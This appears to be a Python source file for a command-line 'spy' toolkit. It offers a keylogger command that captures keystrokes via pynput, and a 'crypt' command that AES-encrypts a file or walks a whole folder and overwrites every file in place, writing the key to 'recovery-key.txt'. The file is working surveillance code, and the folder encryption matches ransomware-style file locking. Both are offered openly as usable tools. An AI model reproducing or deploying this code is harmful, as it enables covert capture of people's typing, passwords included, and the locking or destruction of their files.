import os, click
from pynput.keyboard import Listener
from lash.Exportables.ikeyboard import *
import pyaes as pya


@click.group('spy', help='Spy tools')
def spy():
    ...


@spy.command(help='Keylogger')
@click.option('-p', type=click.Path(exists=True), default='.', help='Path to send output file with info')
def keyboard(p):
    print('<key logger on> f3 to stop record')
    os.chdir(p)
    listener = Listener(on_press=key_down, on_release=key_up)
    listener.start()
    listener.join()
    print(f'> Process Finished <')


@spy.command()
@click.argument('p', metavar='path', type=click.Path(exists=True), required=False, default='.')
@click.argument('key', metavar='<key>', type=click.STRING)
@click.option('-dc', is_flag=True, default=False, help='Decrypt file')
@click.option('-ex', is_flag=True, default=False, help='Export key to text file')
@click.option('-cl', is_flag=True, default=False, help='Crypt all files in a folder')
def crypt(p, key, dc, ex, cl):
    """\b
    Encrypt/Decrypt files with AES algorithm
    \b
    Save the <key> you need her to decode
    The key NEED have 16 characters (128bits)
    \b
    Ex: crypt -ex ...\text.txt $kvzis1@7y602qsx
    """
    bkey = str.encode(key)  # Convert to bytes
    if p.find('\\') == -1 or p.find('/') == -1:
        fp = os.path.join('.', p)
    else:
        fp = p
    if dc:
        file = open(fp, 'rb')
        crip = pya.AESModeOfOperationCTR(bkey)
        data = crip.decrypt(file.read())
        crypted = open(fp, 'wb')
        crypted.write(data)
        print(f'\nFile decrypted successfully')
    else:
        if cl:
            try:
                os.chdir(fp)
            except:
                print(f'\nError the path {fp} is not valid!')
                return
            for root, folder, files in os.walk('.'):
                for file in files:
                    file_value = open(os.path.join(root, file), 'rb')
                    crip = pya.AESModeOfOperationCTR(bkey)
                    data = crip.encrypt(file_value.read())
                    file_value.close()
                    crypted = open(os.path.join(root, file), 'wb')
                    crypted.write(data)
        else:
            file = open(fp, 'rb')
            crip = pya.AESModeOfOperationCTR(bkey)
            data = crip.encrypt(file.read())
            file.close()
            crypted = open(fp, 'wb')
            crypted.write(data)
        if ex:
            if os.name == 'nt':
                if not cl:
                    os.chdir(fp[:fp.rfind('\\')])
                else:
                    pass
            else:
                if not cl:
                    os.chdir(fp[:fp.rfind('\\')])
                pass
            open('recovery-key.txt', 'w').write(key)
        print(f'\nFile(s) encrypted with key: {key}')
